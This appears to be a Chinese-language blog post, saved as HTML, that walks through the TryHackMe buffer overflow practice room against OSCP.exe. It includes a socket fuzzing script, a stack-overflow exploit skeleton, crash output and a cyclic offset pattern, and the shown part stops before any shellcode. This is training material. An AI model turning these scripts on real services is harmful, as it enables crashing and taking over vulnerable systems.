@@ -1,0 +1,759 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bufferoverflowprep  启动Immunity Debugger运行OSCP.exe，发现OSCP.exe正在监听1337端口：  一共十个缓冲区： 123456789101112131415161718Crazy:~&#x2F;tryhackme$ nc 10.10.67.178 1337Welcome to OSCP Vulnerab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区溢出">
+<meta property="og:url" content="http://example.com/2022/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="1https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bufferoverflowprep  启动Immunity Debugger运行OSCP.exe，发现OSCP.exe正在监听1337端口：  一共十个缓冲区： 123456789101112131415161718Crazy:~&#x2F;tryhackme$ nc 10.10.67.178 1337Welcome to OSCP Vulnerab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220802075137125.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220802075700963.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220802222643749.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220802224618514.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220803002419082.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220803002558475.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220803003211596.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220803003757676.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220803012250864.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220803012555560.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220803014535863.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.889Z">
+<meta property="article:modified_time" content="2022-08-16T23:18:47.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220802075137125.png">
+  
+  
+  
+  <title>缓冲区溢出 - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="缓冲区溢出"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          21k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          174 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">缓冲区溢出</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://tryhackme.com/room/bufferoverflowprep<br></code></pre></td></tr></table></figure>
+
+<p>启动Immunity Debugger运行OSCP.exe，发现OSCP.exe正在监听1337端口：</p>
+<p><img src="https://www.worldisend.com/img/image-20220802075137125.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220802075137125"></p>
+<p>一共十个缓冲区：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ nc 10.10.67.178 1337<br>Welcome to OSCP Vulnerable Server! Enter HELP <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>.<br><span class="hljs-built_in">help</span><br>UNKNOWN COMMAND<br>HELP<br>Valid Commands:<br>HELP<br>OVERFLOW1 [value]<br>OVERFLOW2 [value]<br>OVERFLOW3 [value]<br>OVERFLOW4 [value]<br>OVERFLOW5 [value]<br>OVERFLOW6 [value]<br>OVERFLOW7 [value]<br>OVERFLOW8 [value]<br>OVERFLOW9 [value]<br>OVERFLOW10 [value]<br>EXIT<br></code></pre></td></tr></table></figure>
+
+<p>一个FUZZ脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket, time, sys<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br><br>port = <span class="hljs-number">1337</span><br>timeout = <span class="hljs-number">5</span><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br><br>string = prefix + <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> s:<br>      s.settimeout(timeout)<br>      s.connect((ip, port))<br>      s.recv(<span class="hljs-number">1024</span>)<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(string) - <span class="hljs-built_in">len</span>(prefix)))<br>      s.send(<span class="hljs-built_in">bytes</span>(string, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>      s.recv(<span class="hljs-number">1024</span>)<br>  <span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(string) - <span class="hljs-built_in">len</span>(prefix)))<br>    sys.exit(<span class="hljs-number">0</span>)<br>  string += <span class="hljs-number">100</span> * <span class="hljs-string">&quot;A&quot;</span><br>  time.sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>循环向目标程序监听端口发送100个A。以及一个漏洞利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br>port = <span class="hljs-number">1337</span><br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = <span class="hljs-number">0</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h6 id="OVERFLOW1"><a href="#OVERFLOW1" class="headerlink" title="OVERFLOW1:"></a>OVERFLOW1:</h6><p>启动FUZZ脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ python3 fuzz.py   <br>Fuzzing with 100 bytes<br>Fuzzing with 200 bytes<br>Fuzzing with 300 bytes<br>Fuzzing with 400 bytes<br>Fuzzing with 500 bytes<br>Fuzzing with 600 bytes<br>Fuzzing with 700 bytes<br>Fuzzing with 800 bytes<br>Fuzzing with 900 bytes<br>Fuzzing with 1000 bytes<br>Fuzzing with 1100 bytes<br>Fuzzing with 1200 bytes<br>Fuzzing with 1300 bytes<br>Fuzzing with 1400 bytes<br>Fuzzing with 1500 bytes<br>Fuzzing with 1600 bytes<br>Fuzzing with 1700 bytes<br>Fuzzing with 1800 bytes<br>Fuzzing with 1900 bytes<br>Fuzzing with 2000 bytes<br>Fuzzing crashed at 2000 bytes<br></code></pre></td></tr></table></figure>
+
+<p>其发送了2000个字节后停止发送，目标程序发生崩溃。</p>
+<p><img src="https://www.worldisend.com/img/image-20220802075700963.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220802075700963"></p>
+<p>此时EIP的值已经是41414141，也就是十六进制四个A，说明其存在溢出漏洞。紧接着需要确定具体是那一片的A将EIP的值进行了溢出覆盖,metasploit可以快速的生成一片字符串用以很方便的确定溢出位置偏移量：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ pattern_create.rb -l 2000<br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co<br></code></pre></td></tr></table></figure>
+
+<p>将其复制粘贴到漏洞利用脚本payload中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br>port = <span class="hljs-number">1337</span><br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = <span class="hljs-number">0</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>然后将目标程序重新启动。运行脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ python3 exploit.py<br>Sending evil buffer...<br>Done!<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220802222643749.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220802222643749"></p>
